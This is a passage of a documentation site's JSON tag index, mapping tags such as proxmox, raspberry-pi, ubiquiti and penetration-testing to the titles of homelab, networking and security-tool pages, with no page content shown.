Package Manager</li> <li>Ruby Gem Package Manager</li> </ul>"}, {"location": "tags/#passthrough", "title": "passthrough", "text": "<ul> <li>GPU Passthrough to VM</li> <li>iGPU Passthrough to VM</li> <li>iGPU Split Passthrough</li> <li>vGPU Split Passthrough</li> </ul>"}, {"location": "tags/#penetration-testing", "title": "penetration-testing", "text": "<ul> <li>Apktool</li> <li>PT Application</li> <li>MobSF</li> <li>Cli Commands Collation</li> <li>Gobuster CheatSheet</li> <li>Nmap CheatSheet</li> <li>XSS CheatSheet</li> <li>Bettercap 1.6.2 Installation</li> <li>Kali Linux</li> </ul>"}, {"location": "tags/#pi-hole", "title": "pi-hole", "text": "<ul> <li>Pi-hole Cloudflare DNS Sync</li> <li>Pi-hole with DOH on Docker</li> </ul>"}, {"location": "tags/#pip", "title": "pip", "text": "<ul> <li>Pip Package Manager</li> </ul>"}, {"location": "tags/#pm2", "title": "pm2", "text": "<ul> <li>PM2 - Node.js Process Manager</li> </ul>"}, {"location": "tags/#portfolio", "title": "portfolio", "text": "<ul> <li>Stas Yakobov's Portfolio</li> </ul>"}, {"location": "tags/#ports", "title": "ports", "text": "<ul> <li>Free 80,443 Ports</li> </ul>"}, {"location": "tags/#powershell", "title": "powershell", "text": "<ul> <li>DDNS Cloudflare PowerShell</li> <li>Windows SSH Server</li> </ul>"}, {"location": "tags/#privacy-policy", "title": "privacy policy", "text": "<ul> <li>Privacy Policy</li> </ul>"}, {"location": "tags/#process-manager", "title": "process-manager", "text": "<ul> <li>PM2 - Node.js Process Manager</li> </ul>"}, {"location": "tags/#processes-manager", "title": "processes-manager", "text": "<ul> <li>Supervisor Process Manager</li> </ul>"}, {"location": "tags/#proxmox_1", "title": "proxmox", "text": "<ul> <li>Cloud Image Template</li> <li>Let's Encrypt with Cloudflare</li> <li>PVE Kernel Cleaner</li> <li>VM Disk Expander</li> <li>GPU Passthrough to VM</li> <li>iGPU Passthrough to VM</li> <li>iGPU Split Passthrough</li> <li>vGPU Split Passthrough</li> <li>Disable IPv6 on Proxmox</li> <li>Proxmox Networking</li> </ul>"}, {"location": "tags/#pt", "title": "pt", "text": "<ul> <li>Cli Commands Collation</li> <li>Links and Tools</li> <li>Metasploit Framework</li> <li>Wifite</li> <li>About Proxmark3</li> <li>Proxmark3 CheatSheet</li> <li>Mifare Classic 1K ISO14443A</li> <li>Clickjacking Test Page</li> <li>IID Generator &amp; Validator</li> </ul>"}, {"location": "tags/#python", "title": "python", "text": "<ul> <li>Pip Package Manager</li> <li>Supervisor Process Manager</li> <li>Virtual Environment</li> <li>Pyenv-virtualenv Multi Version</li> </ul>"}, {"location": "tags/#quotes", "title": "quotes", "text": "<ul> <li>Tables, Lists and Quotes</li> </ul>"}, {"location": "tags/#raspberry-pi", "title": "raspberry-pi", "text": "<ul> <li>Docker on Raspberry Pi</li> <li>External Power Button</li> <li>Motion Sensor Display Control</li> <li>Snippets</li> <li>3g Modem Host Configuration</li> <li>Magic Mirror 2.0</li> <li>Magic Mirror</li> </ul>"}, {"location": "tags/#resume", "title": "resume", "text": "<ul> <li>Stas Yakobov's Portfolio</li> </ul>"}, {"location": "tags/#reverse-engineering", "title": "reverse-engineering", "text": "<ul> <li>Apktool</li> </ul>"}, {"location": "tags/#rfid", "title": "rfid", "text": "<ul> <li>About Proxmark3</li> <li>Proxmark3 CheatSheet</li> <li>Mifare Classic 1K ISO14443A</li> </ul>"}, {"location": "tags/#rsa", "title": "rsa", "text": "<ul> <li>SSH Hardening with SSH Keys</li> </ul>"}, {"location": "tags/#rsa-keys", "title": "rsa-keys", "text": "<ul> <li>SSH With RSA Keys</li> <li>Windows SSH Server</li> </ul>"}, {"location": "tags/#ruby", "title": "ruby", "text": "<ul> <li>Ruby Gem Package Manager</li> </ul>"}, {"location": "tags/#security_1", "title": "security", "text": "<ul> <li>Removing Sensitive Data</li> </ul>"}, {"location": "tags/#servers", "title": "servers", "text": "<ul> <li>Windows Servers</li> </ul>"}, {"location": "tags/#share", "title": "share", "text": "<ul> <li>SMB Mount With autofs</li> </ul>"}, {"location": "tags/#smb", "title": "smb", "text": "<ul> <li>SMB Mount With autofs</li> </ul>"}, {"location": "tags/#snippets", "title": "snippets", "text": "<ul> <li>General Snippets</li> </ul>"}, {"location": "tags/#ssh_1", "title": "ssh", "text": "<ul> <li>Enable SSH Root Login</li> <li>SSH With RSA Keys</li> <li>SSH Hardening with SSH Keys</li> </ul>"}, {"location": "tags/#ssh-server", "title": "ssh-server", "text": "<ul> <li>Windows SSH Server</li> </ul>"}, {"location": "tags/#ssl-pinning", "title": "ssl-pinning", "text": "<ul> <li>SSL Pinning Bypass</li> </ul>"}, {"location": "tags/#submodules", "title": "submodules", "text": "<ul> <li>Submodules Cheat Sheet</li> </ul>"}, {"location": "tags/#supervisor", "title": "supervisor", "text": "<ul> <li>Supervisor Process Manager</li> </ul>"}, {"location": "tags/#syncthing", "title": "syncthing", "text": "<ul> <li>Syncthing</li> </ul>"}, {"location": "tags/#synology_1", "title": "synology", "text": "<ul> <li>Syncthing</li> <li>oh-my-zsh on Synology NAS</li> <li>Install VM Tools on Virtual Machine</li> <li>Auto DSM Config Backup</li> <li>Free 80,443 Ports</li> <li>Enable SSH Root Login</li> <li>SSH With RSA Keys</li> </ul>"}, {"location": "tags/#tables", "title": "tables", "text": "<ul> <li>Tables, Lists and Quotes</li> </ul>"}, {"location": "tags/#template", "title": "template", "text": "<ul> <li>Disable IPV6</li> <li>oh-my-zsh Install</li> <li>Snippets</li> <li>Awesome Pages Plugin</li> </ul>"}, {"location": "tags/#terminal", "title": "terminal", "text": "<ul> <li>Better Terminal Experience</li> <li>TouchID for sudo</li> </ul>"}, {"location": "tags/#text-highlighting", "title": "text-highlighting", "text": "<ul> <li>Basic Formatting</li> </ul>"}, {"location": "tags/#timezone", "title": "timezone", "text": "<ul> <li>Locales &amp; Timezone</li> </ul>"}, {"location": "tags/#tools", "title": "tools", "text": "<ul> <li>Gobuster CheatSheet</li> <li>Nmap CheatSheet</li> <li>XSS CheatSheet</li> <li>Bettercap 1.6.2 Installation</li> <li>Links and Tools</li> <li>Metasploit Framework</li> <li>Wifite</li> <li>About Proxmark3</li> <li>Proxmark3 CheatSheet</li> <li>Mifare Classic 1K ISO14443A</li> <li>Clickjacking Test Page</li> <li>IID Generator &amp; Validator</li> </ul>"}, {"location": "tags/#touchid", "title": "touchID", "text": "<ul> <li>TouchID for sudo</li> </ul>"}, {"location": "tags/#ubiquiti", "title": "ubiquiti", "text": "<ul> <li>EdgeRouter</li> <li>CLI Commands</li> <li>Failover Telegram Notifications</li> <li>Persistent Boot Script</li> <li>Persistent SSH Keys</li> <li>Better Fan Speeds</li> <li>UDM Cloudflare DDNS</li> <li>Wireguard VPN</li> </ul>"}, {"location": "tags/#ubuntu_1", "title": "ubuntu", "text": "<ul> <li>Disable IPv6 via Grub</li> <li>Remove Snap Store</li> <li>Unattended Upgrades</li> </ul>"}, {"location": "tags/#udm", "title": "udm", "text": "<ul> <li>CLI Commands</li> <li>Failover Telegram Notifications</li> <li>Persistent Boot Script</li> <li>Persistent SSH Keys</li> <li>Better Fan Speeds</li> <li>UDM Cloudflare DDNS</li> <li>Wireguard VPN</li> </ul>"}, {"location": "tags/#unifi", "title": "unifi", "text": "<ul> <li>CLI Commands</li> <li>Failover Telegram Notifications</li> <li>Persistent Boot Script</li> <li>Persistent SSH Keys</li> <li>Better Fan Speeds</li> <li>UDM Cloudflare DDNS</li> <li>Wireguard VPN</li> </ul>"}, {"location": "tags/#utilities", "title": "utilities", "text": "<ul> <li>Useful Links &amp; Tools</li> <li>Wifi QR Image Generator</li> <li>Useful Software</li> <li>Windows Servers</li> <li>Declare Locations as \"Inside Your Local Network\"</li> <li>Send Emails From The Windows Task Scheduler</li> </ul>"}, {"location": "tags/#venv", "title": "venv", "text": "<ul> <li>Virtual Environment</li> </ul>"}, {"location": "tags/#vgpu", "title": "vgpu", "text": "<ul> <li>vGPU Split Passthrough</li> </ul>"}, {"location": "tags/#virtualization", "title": "virtualization", "text": "<ul> <li>Cloud Image Template</li> <li>VM Disk Expander</li> </ul>"}, {"location": "tags/#vmware", "title": "vmware", "text": "<ul> <li>VMware Fusion</li> </ul>"}, {"location": "tags/#vmware-fusion", "title": "vmware-fusion", "text": "<ul> <li>VMware Fusion</li> </ul>"}, {"location": "tags/#watchtower", "title": "watchtower", "text": "<ul> <li>Watchtower</li> </ul>"}, {"location": "tags/#wifi", "title": "wifi", "text": "<ul> <li>Wifite</li> </ul>"}, {"location": "tags/#windows_1", "title": "windows", "text": "<ul> <li>Syncthing</li> <li>Windows SSH Server</li> <li>Useful Software</li> <li>Windows Servers</li> <li>Declare Locations as \"Inside Your Local Network\"</li> <li>Send Emails From The Windows Task Scheduler</li> </ul>"}, {"location": "tags/#wireguard", "title": "wireguard", "text": "<ul> <li>Wireguard VPN</li> </ul>"}, {"location": "tags/#zsh", "title": "zsh", "text": "<ul> <li>Better Terminal Experience</li> </ul>"}]}